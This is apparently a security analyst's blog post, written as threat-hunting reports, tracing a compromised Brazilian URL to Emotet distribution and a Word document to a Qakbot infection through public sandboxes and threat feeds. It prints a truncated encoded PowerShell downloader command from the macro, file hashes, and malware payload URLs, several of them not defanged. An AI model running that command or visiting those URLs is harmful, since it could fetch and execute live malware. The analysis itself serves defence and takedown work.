---
layout: post
title:  "Threat Hunting Report"
description : The following are examples of how we perform Threat Hunting reports for our clients.
tags: Threat-Hunting, IOC, any-run, virus-total, hash, powershell
---

> Please provide what details you are able to gather about the following URL.
> This is something we might commonly be provided by a Crimeware client as part of a standard research and mitigation request. As with our service these requests can be pretty open 
> ended.
> With that in mind go as far as you feel is required to provide a sufficient response and highlight what might need to be included in a takedown to prospect our client or their
> customers. 
> Make sure to identify if the domain or related IOCS are hacked, or setup by a malicious actor and any valid files, hashes ETC.

```ruby
https://www.actacomunicacao.com.br/provisorio/docs/mq57mhq07gy/
```

To start off on any investigation I like to just do a quick Google search to see if anyone else has looked at the same thing. A good number of times this will help speed up an investigation, additionally it provides some already timestamped and openly available information that can be shared with a provider.

## A quick search of the provided URL returns multiple resources mentioning it exactly. The best part here is these are hits on the exact URL we are looking for.

![alt text](https://Rayferrufino.github.io/assets/pic1.png "Logo Title Text 1")

## I will highlight a few of these below:

```python
https://urlhaus.abuse.ch/url/428853/
https://paste.cryptolaemus.com/emotet/2020/08/10/emotet-malware-IoCs_08-10-20.html
https://paste.cryptolaemus.com/emotet/2020/08/12/emotet-malware-IoCs_08-12-20.html
```

It would appear that the URL is possibly tied to Emotet in some way. We continue to investigate some of these public posts on the URL and quickly can find a good number of doc files posted on Urlhaus tied to the exact url. 

```python
https://urlhaus.abuse.ch/url/428853/
https://urlhaus.abuse.ch/host/www.actacomunicacao.com.br/
```

![alt text](https://Rayferrufino.github.io/assets/pic2.png "Logo Title Text 1")

## Taking the earliest posted sample as an example we are given the following:

```python
File: FILE_ET5654085637AL.doc	
MD5 70fbdde86b9ae6a733975dc0980ea712
SHA-1 bae75e0727170969890336eb60f875267ddc0e35
SHA-256 0edb0478a03da835ad18ca5571a31731a6cf1922642d5ffd2940ec40dfdbae13
```

## Searching for the file hash gets you yet another publicly posted blog mentioning it and how its tied to Emotet:

```ruby
https://paste.cryptolaemus.com/emotet/2020/08/10/emotet-malware-IoCs_08-10-20.html
```


## A quick check on Virustotal for the file also shows bit more about how the file might be used:

```ruby
https://www.virustotal.com/gui/file/0edb0478a03da835ad18ca5571a31731a6cf1922642d5ffd2940ec40dfdbae13/relations
```

![alt text](https://Rayferrufino.github.io/assets/pic3.png "Logo Title Text 1")

```ruby
https://www.virustotal.com/gui/file/0edb0478a03da835ad18ca5571a31731a6cf1922642d5ffd2940ec40dfdbae13/behavior/Lastline
```
![alt text](https://Rayferrufino.github.io/assets/pic4.png "Logo Title Text 1")

Reviewing the behavior and relationship tabs of the above report we see multiple URLs which might be an indication the file is either being dropped, reaching out to or somehow doing something with some of these.

## Online sandbox report:

```ruby
https://app.any.run/tasks/800484d8-7d39-40ef-a4ac-3ba54481696b/
```
![alt text](https://Rayferrufino.github.io/assets/pic5.png "Logo Title Text 1")

From the report we see a call to PowerShell with a long string of characters followed by a new binary being spawned.

## This is a base64 encoded block in a request like the one below:
```ruby
>> powersheLL -e JABWAEgAVQBLAFEAZgBmAHcAPQAnAEEASABEAEoAQgByAGcAYgAnADsAWwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAIgBzAEUAYABDAFUAUgBJAGAAVABZAFAAYABSAG8AdABvAGAAYwBvAEwAIgAgAD0AIAAnAHQAbABzADEAMgAsACAAdABsAHMAMQAxACwAIAB0AGwAcwAnADsAJABXAFEAUQBNAEQAcwBnAGEAIAA9ACAAJwA3ADEAMgAnADsAJABRAEwAUABF….
```

#  Static code analysis:
The PowerShell code is acting as a downloader with a hardcoded list of URLs to iterate through.

![alt text](https://Rayferrufino.github.io/assets/pic6.png "Logo Title Text 1")

## This is also seen being executed in the call graph within the sandbox report.

![alt text](https://Rayferrufino.github.io/assets/pic7.png "Logo Title Text 1")


## Taking one of the URLs from the list: 
```ruby
http://iraniansk.com/wp-content/rm1q_q6x4_l5/
```
We can see it dropped a file during the sandbox run.


## Dropped file:

```ruby
File: rm1q_q6x4_l5 (identified as emotet)
MD5 16BF0F7A0D8008AEF4FDECCD749C7830
SHA1 6AB5FE9A8CF33D8043E7FF3CF6880CA8FB375D20
SHA256 12C0DEAECAFCF3A79D6EF2097E1F0CCC7F72017D7612F45DE8AFB99943FC4875
```
## Searching for this file we find multiple public reports as well:

```ruby
https://feodotracker.abuse.ch/browse/host/74.120.55.163/
```

```ruby
https://app.any.run/tasks/800484d8-7d39-40ef-a4ac-3ba54481696b/
```


# Dynamic analysis:

## Submitting the dropped binary to a public sandbox further points to it being related to Emotet.

```ruby
https://capesandbox.com/submit/status/49440/
```
![alt text](https://Rayferrufino.github.io/assets/pic8.png "Logo Title Text 1")

![alt text](https://Rayferrufino.github.io/assets/pic9.png "Logo Title Text 1")


Additionally, we can confirm from the extracted config above that the PowerShell based request below and the immediate traffic after are related. 

![alt text](https://Rayferrufino.github.io/assets/pic10.png "Logo Title Text 1")

# Summary:

In summary the URL h[xx]ps://www.actacomunicacao.com.br/provisorio/docs/mq57mhq07gy/ appears it was for some period of time used as an Emotet distribution point. Reviewing the site and domain history it is likely this site was hacked, and the attacker used this compromised site to distribute their malware. Further research into how such a site would typically be used leads to a useful repository of data https://github.com/NavyTitanium/Misc-Malwares/tree/master/Emotet


## From the dropped documents we see they contained macro code that would be used to download the actual Emotet binary from URLs similar to the ones below:
```ruby
•	http://iraniansk.com/wp-content/rm1q_q6x4_l5/
•	http://kachetemarketing.com/cgi-bin/9yxsy_nq02_x2tv/
•	http://kinotheque.com/wp-includes/aidu_9c8_rrlp/
•	https://onyourleftracing.com/cgi-bin/fotes_4l_enxguwo/
•	http://slimgenemd.com/hqzfg/z_ya_xkjx5/
```


> Starting with the previous sandbox report describe what is going on, what malware is being dropped and what infrastructure might be important here. Include IOC data that would be useful in blocking and mitigating the relevant threats here. 

```ruby
File: "08142020_121494057.doc"  
MD5: 81FEF56212815515D22B62D3824EF5AF
SHA1: 8DDE045FA14ADC846B3B0F6302C8D8B249895641 
SHA256: 37CFFED69A1601C82615DE5B8C319B35B09C6B7A6F9E879AD9997309FBCC7775
https://app.any.run/tasks/24d633a6-a75f-490a-b091-cac7617e1c9b/
```
Reviewing the sandbox report above we see a few interesting parts. To start we see a document triggering multiple sub processes and files being written after a PowerShell execution. Additionally we see an http request to a URL 
```ruby 
http://rijschoolfastandserious.nl/rprmloaw/111111.png
```
which could be the source of some of the activity we are seeing.
![alt text](https://Rayferrufino.github.io/assets/pic11.png "Logo Title Text 1")

## Reviewing the process graph we see a clearer breakdown of events. We also see the highlighted QBOT process being spawned by the activity kicked off by PowerShell.
![alt text](https://Rayferrufino.github.io/assets/pic12.png "Logo Title Text 1")

## Looking at the IOC section of the report we can see some useful data to dig into.
![alt text](https://Rayferrufino.github.io/assets/pic13.png "Logo Title Text 1")


Looking specifically at the file being requested via the HTTP Requests tab we download a copy of the file to analyze. 
> (7125EA5182AD4B5E0C5AFF3764E0BFC4)

![alt text](https://Rayferrufino.github.io/assets/pic14.png "Logo Title Text 1")

## You can analyze this file many ways, but for speed and simplicity I just submit it to an online sandbox at the provided URL:
```ruby
https://capesandbox.com/submit/status/49449/
```
![alt text](https://Rayferrufino.github.io/assets/pic15.png "Logo Title Text 1")

This could be done by checking Virustotal and a few other online resources for bits of data or even manually analyze the binary and compare the results to well documented online resources, but for now we are ok to trust the sandbox report based on what we are seeing. 

![alt text](https://Rayferrufino.github.io/assets/pic16.png "Logo Title Text 1")

## You can quickly see the CAPE has extracted a configuration from this binary and identified it as Qakbot (QBOT).

# Reviewing the DOC file itself in the sandbox report:

Further review of the initial report we see PowerShell execution. Digging deeper into this section of the report we see a clear text string with multiple URLs inside.
![alt text](https://Rayferrufino.github.io/assets/pic17.png "Logo Title Text 1")

# Extracted Marco code:
> * The following part could be done with many online tools or by hand. *

![alt text](https://Rayferrufino.github.io/assets/pic18.png "Logo Title Text 1")

Throwing the DOC into a safe environment I reviewed the Macros within it. Once again there are many ways of doing this safely, I just went with a manual approach. 

![alt text](https://Rayferrufino.github.io/assets/pic19.png "Logo Title Text 1")

There is a Marco triggered on the opening of the document as well as the closure of the document. Additionally, you can see highlighted below there is a WScript that will get called within the Document.

![alt text](https://Rayferrufino.github.io/assets/pic20.png "Logo Title Text 1")

Extracting out and cleaning up some of the code in the highlighted box above we end up with something similar to the below code snippet which matches what we were seeing earlier in the report.

# Summary:

### In summary we have a Document that when run will trigger a sequence of file writes including executing a PowerShell command to download a remote file from a list of URLs. A complete list of these are provided below:

*	hxxp://rijschoolfastandserious.nl/rprmloaw/111111.png 
*	hxxp://nanfeiqiaowang.com/tsxwe/111111.png
*	hxxp://forum.insteon.com/suowb/111111.png
*	hxxp://webtest.pp.ua/yksrpucvx/111111.png
*	hxxp://quoraforum.com/btmlxjxmyxb/111111.png
*	hxxp://quickinsolutions.com/wfqggeott/111111.png
*	hxxp://bronco.is/pdniovzkgwwt/111111.png
*	hxxp://studiomascellaro.it/wnzzsbzbd/111111.png
*	hxxp://craniotylla.ch/vzufnt/111111.png
*	hxxp://marineworks.eu/dwaunrsamlbq/111111.png

```ruby
File: 111111.png
MD5 7125ea5182ad4b5e0c5aff3764e0bfc4
SHA1 ec8428ab51a8344b1b491743fa280dfc3258b58b
SHA256 1462d21815747b59d0ea426b13e1a60c4900c9dca5ba2783625c861f2daa8ca3
```
### Once downloaded this new file will be run on the machine and appears to be a copy of QBOT/Qakbot with a Campaign ID spx155. A complete list of the related controllers for this malware can be found in the sandbox report linked above as well as the extracted configuration details. 

